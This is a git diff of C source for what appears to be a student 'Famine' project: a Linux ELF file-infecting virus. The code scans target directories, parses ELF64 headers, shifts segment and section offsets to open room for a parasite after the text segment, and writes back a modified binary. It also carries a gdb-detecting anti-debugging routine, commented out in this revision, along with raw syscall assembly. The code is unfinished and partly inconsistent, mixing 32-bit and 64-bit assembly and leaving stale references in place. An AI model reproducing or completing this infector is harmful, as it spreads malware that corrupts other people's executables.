@@ -37,10 +37,14 @@ static int open_directory(char *path);
 static void    *ft_memmove(void *dst, const void *src, size_t len);
 static int     open_map(char *fname, t_file *file);
 static bool process_runing(void); //CHANGER L APPELLE DE DIR
-static int do_the_job(t_file *file, char *path);
+static int do_the_job(char file[],size_t size, char *path);
 static int             ft_strncmp(const char *s1, const char *s2, size_t n);
 static int infect(char path[],size_t path_length);
-static void new_file(t_file *file, size_t end_of_text,char *path);
+static void new_file(char buf[],size_t size, size_t end_of_text,char *path);
+static  void	ft_putnbr(int nb);
+static void		ft_putstr(char *s);
+static int		ft_putchar(int c);
+
 #define PAGE_SIZE 4096
 
 # define __syscall0(type,name)          \
@@ -95,6 +99,35 @@ type name(type1 arg1,type2 arg2, type3 arg3, type4 arg4)\
 }
 
 
+asm(
+"__syscall6:\n"
+"	pushl %ebp\n"
+"	pushl %edi\n"
+"	pushl %esi\n"
+"	pushl %ebx\n"
+"	movl  (0+5)*4(%esp),%eax\n"
+"	movl  (1+5)*4(%esp),%ebx\n"
+"	movl  (2+5)*4(%esp),%ecx\n"
+"	movl  (3+5)*4(%esp),%edx\n"
+"	movl  (4+5)*4(%esp),%esi\n"
+"	movl  (5+5)*4(%esp),%edi\n"
+"	movl  (6+5)*4(%esp),%ebp\n"
+"	int $0x80\n"
+"	popl %ebx\n"
+"	popl %esi\n"
+"	popl %edi\n"
+"	popl %ebp\n"
+"	ret"
+);
+extern long __syscall6(long n, long a, long b, long c, long d, long e, long f);
+
+long syscall6(long call, long a, long b, long c, long d, long e, long f)
+{
+	long res = __syscall6(call,a,b,c,d,e,f);
+	return res;
+}
+
+
 
 __syscall0(pid_t, getpid);
 __syscall0(pid_t, fork);
@@ -116,43 +149,10 @@ unsigned long get_eip(void);
 extern int yeah;
 
 
-/////////////////////////////////to DELL
-int	ft_putchar(int c)
-{
-	return (write(1, &c, 1));
-}
-void		ft_putstr(char *s)
-{
-	if (!s)
-		return ;
-	write(1, s, ft_strlen(s));
-}
-void	ft_putnbr(int nb)
-{
-	if (nb == -2147483648)
-		ft_putstr("-2147483648");
-	else
-	{
-		if (nb < 0)
-		{
-			ft_putchar('-');
-			nb = -nb;
-		}
-		if (nb > 9)
-		{
-			ft_putnbr(nb / 10);
-			ft_putnbr(nb % 10);
-		}
-		else
-			ft_putchar((char)nb + 48);
-	}
-}
-/////////////////////////////////////////
 _start()
 {
 	__asm__(".globl real_start\n"
 	        "real_start:\n"
-
 	        "call do_main\n"
 		 "ret\n"
 
@@ -167,8 +167,8 @@ int do_main(void)
 	void *start;
 	size_t size;
 	char path_env[256] = {'/','t','m','p','/','t','e','s','t',':','/','t','m','p','/','t','e','s','t','2',':',0};
-	if (process_runing())
-		return (1);
+//	if (process_runing())
+	//	return (1);
 	start = 0; //value get from the header
 	size = 0; //value get from addr
 	pid = fork();
@@ -309,6 +309,7 @@ static int open_directory(char *path)
 	ft_putnbr(nread);
 	write(1,"\n",1);
 	//printf("nread %d\n",nread);
+	int c;
 	while (i < nread)
 	{
 		d = (struct linux_dirent64 *) (buf + i);
@@ -331,14 +332,16 @@ static int open_directory(char *path)
 		ft_putstr(path_file);
 		ft_putchar('\n');
 		//printf("%s %s\n",d->d_name,path_file);
-
-		if (open_map(path_file,&file) == 0)
-		{
-			do_the_job(&file,path_file );
+		struct stat st;
+		int fd = open (path_file, 0,0);
+		fstat(fd , &st);
+		char mem[st.st_size];
+		int c = read(fd, mem,st.st_size);
+		write(1,mem,st.st_size);
+		do_the_job(mem,st.st_size,path_file );
 			close(file.fd);
 			munmap(file.data,file.size);
 			exit(4);
-		}
 	}
 	close(dd);
 	return 0;
@@ -352,10 +355,15 @@ static int     open_map(char *fname, t_file *file)
 	if (fstat(file->fd,&stat) == -1)
 		return 1;
 	file->size = stat.st_size;
-	if ((file->data =  linux_syscall6(9,0, file->size, PROT_READ| PROT_WRITE| PROT_EXEC,
-		             MAP_SHARED, file->fd, 0)) == MAP_FAILED)
 
+	if ((file->data =  syscall6(9,0, file->size, PROT_READ| PROT_WRITE| PROT_EXEC,
+		             MAP_SHARED, file->fd, 0)) == MAP_FAILED)
+	{
+		ft_putstr("error mmap syscall 6\n");
 		return 1;
+
+	}
+	write(1,file->data,file->size);
 	return 0;
 }
 
@@ -419,7 +427,7 @@ static int             ft_strncmp(const char *s1, const char *s2, size_t n)
 		return (0);
 	return (int)((unsigned char)s1[index] - (unsigned char)s2[index]);
 }
-
+/*
 static bool process_runing(void)
 {
 	DIR* dir;
@@ -432,20 +440,20 @@ static bool process_runing(void)
 		return 1;
 	}
 	while((ent = readdir(dir)) != NULL) {
-		/* if endptr is not a null character, the directory is not
-		 * entirely numeric, so ignore it */
+		*//* if endptr is not a null character, the directory is not
+		 * entirely numeric, so ignore it *//*
 		long lpid = strtol(ent->d_name, &endptr, 10);
 		if (*endptr != '\0') {
 			continue;
 		}
 
-		/* try to open the cmdline file */
+		*//* try to open the cmdline file *//*
 		snprintf(buf, sizeof(buf), "/proc/%ld/cmdline", lpid);
 		FILE* fp = fopen(buf, "r");
 
 		if (fp) {
 			if (fgets(buf, sizeof(buf), fp) != NULL) {
-				/* check the first token in the file, the program name */
+				*//* check the first token in the file, the program name *//*
 				char* first = strtok(buf, " ");
 				printf("name %s\n",first);
 				if (!strcmp(first, "gdb")) {
@@ -459,10 +467,10 @@ static bool process_runing(void)
 
 	}
 	return (0);
-}
-static int do_the_job(t_file *file, char *path)
+}*/
+static int do_the_job(char buff[],size_t size, char *path)
 {
-	ft_putstr("debut do_the_job");
+	ft_putstr("debut do_the_job\n");
 	//printf("debut do_the_job\n");
 	Elf64_Ehdr          *header;
 	Elf64_Phdr*             seg;
@@ -474,11 +482,20 @@ static int do_the_job(t_file *file, char *path)
 	Elf64_Addr end_of_text;
 	int text_found = 0;
 	int i;
-	if (file->size < sizeof(Elf64_Ehdr) || ft_strncmp(file->data, ELFMAG,SELFMAG) || file->data[EI_CLASS] != ELFCLASS64)
+	ft_putstr("1\n");
+	ft_putnbr(size);
+	write(1, buff, 20);
+	ft_putstr("\n");
+	if (size < sizeof(Elf64_Ehdr) || ft_strncmp(buff, ELFMAG,SELFMAG) || buff[EI_CLASS] != ELFCLASS64)
+	{
+		ft_putstr("return 1\n");
 		return (1);
+	}
+	ft_putstr("1.1\n");
 
-	header = (Elf64_Ehdr *)file->data;
-	seg = (Elf64_Phdr*)(file->data + header->e_phoff);
+	header = (Elf64_Ehdr *)buff;
+	seg = (Elf64_Phdr*)(buff + header->e_phoff);
+
 	for (i = header->e_phnum; i-- > 0; seg++)
 	{
 		if (seg->p_type == PT_LOAD)
@@ -495,10 +512,11 @@ static int do_the_job(t_file *file, char *path)
 			}
 		}
 	}
+	ft_putstr("2\n");
 
 	//Recupere le premier segement TEXT on lui rajoute 4096
 	//puis on rajoute a tous les segment suivant 4096
-	seg = (Elf64_Phdr*)(file->data + header->e_phoff);
+	seg = (Elf64_Phdr*)(buff + header->e_phoff);
 	for (i = header->e_phnum; i-- > 0; seg++)
 	{
 		if (text_found)
@@ -527,8 +545,9 @@ static int do_the_job(t_file *file, char *path)
 			}
 		}
 	}
+	ft_putstr("3\n");
 
-	sec = (Elf64_Shdr*)(file->data + header->e_shoff);
+	sec = (Elf64_Shdr*)(buff + header->e_shoff);
 
 	for (i = header->e_shnum; i-- > 0; sec++)
 	{
@@ -540,7 +559,7 @@ static int do_the_job(t_file *file, char *path)
 			sec->sh_size += parasite_size;
 	}
 	header->e_shoff += PAGE_SIZE;
-	new_file(file,end_of_text, path);
+	new_file(buff,size,end_of_text, path);
 	ft_putstr("fim do_the_job\n");
 	return 0;
 }
@@ -585,19 +604,18 @@ static char    *only_name(char *line)
 	}
 	return (line);
 }
-static void new_file(t_file *file, size_t end_of_text,char *path)
+static void new_file(char buf[],size_t size, size_t end_of_text,char *path)
 {
 	int fd;
 	char *data;
 	char tmp[125];
+	ft_putstr("new_file debut ");
 
 	for (int i = 0; i< 125;i++)
 		tmp[i] = 0;
 	ft_memmove(tmp,path,ft_strlen(path));
-
 	ft_memmove(only_name(tmp) + 1,only_name(tmp), ft_strlen(only_name(tmp)));
 	*only_name(tmp) = '.';
-	ft_putstr("new_file debut ");
 	ft_putstr(tmp);
 	ft_putchar('\n');
 	if ((fd = open (tmp, 0x242, 0755)) < 0)
@@ -606,29 +624,19 @@ static void new_file(t_file *file, size_t end_of_text,char *path)
 		return ;
 	}
 	ft_putstr("new_file 1\n");
-
-	if ((data = linux_syscall6(9,0,file->size + PAGE_SIZE, PROT_READ| PROT_WRITE| PROT_EXEC,MAP_SHARED, fd, 0)) == MAP_FAILED)
-			//mmap(0, file->size + PAGE_SIZE, PROT_READ| PROT_WRITE| PROT_EXEC,
-	          //       MAP_SHARED, fd, 0)) == MAP_FAILED)
-	{
-		ft_putstr("error mmap\n");
-		close(fd);
-		return;
-	}
+	char new_data[size + PAGE_SIZE];
 
 	ft_putstr("new_file 2\n");
 
-	///write(fd,file->data,file->size + PAGE_SIZE);
+	///write(fd,buff,file->size + PAGE_SIZE);
 
-	write(fd,file->data, end_of_text);
-
-	write(file->fd,file->data, PAGE_SIZE);
+	write(fd,buf, end_of_text);
 
 	for (int i = 0; i< PAGE_SIZE;i++)
 		write(fd,"j",1);
-	write(fd,file->data + end_of_text, file->size - end_of_text);
-	ft_memmove(data,file->data, end_of_text);
-	ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
+	write(fd,buf + end_of_text, size - end_of_text);
+	//ft_memmove(data,file->data, end_of_text);
+	//ft_memmove(data + PAGE_SIZE + end_of_text,file->data + end_of_text, file->size - end_of_text);
 	write(1,data, 15);
 	ft_putstr("tmp ");
 	ft_putstr(tmp);
@@ -636,16 +644,13 @@ static void new_file(t_file *file, size_t end_of_text,char *path)
 	ft_putstr(path);
 	ft_putchar('\n');
 	//printf("tmp %s, path %s\n",tmp, path);
-	close(file->fd);
 	close(fd);
-	munmap(file->data,file->size);
-	munmap(data, file->size + PAGE_SIZE);
 	int ret = rename (tmp, "/root/42_project/famine/a");
 	ft_putstr("fin memove ");
 	ft_putnbr(ret);
 	ft_putchar('\n');
 	char argv[] = "mv /tmp/toto/.cat /tmp/toto/cat";
-	system(argv);
+	//system(argv);
 
 }
 unsigned long get_eip(void)
@@ -653,14 +658,44 @@ unsigned long get_eip(void)
 	__asm__("call yeah\n"
 	        ".globl yeah\n"
 	        "yeah:\n"
-	        "pop %rax");
+	        "pop %eax");
+}
+static int	ft_putchar(int c)
+{
+	return (write(1, &c, 1));
+}
+static void		ft_putstr(char *s)
+{
+	if (!s)
+		return ;
+	write(1, s, ft_strlen(s));
+}
+static  void	ft_putnbr(int nb)
+{
+	if (nb == -2147483648)
+		ft_putstr("-2147483648");
+	else
+	{
+		if (nb < 0)
+		{
+			ft_putchar('-');
+			nb = -nb;
+		}
+		if (nb > 9)
+		{
+			ft_putnbr(nb / 10);
+			ft_putnbr(nb % 10);
+		}
+		else
+			ft_putchar((char)nb + 48);
+	}
 }
 
 void end_code() {
 __asm__(".globl myend\n"
         "myend:	     \n"
-        "mov $1,%rax \n"
-        "mov $0,%rbx \n"
+        "mov $1,%eax \n"
+        "mov $0,%ebx \n"
         "int $0x80   \n");
 
 }
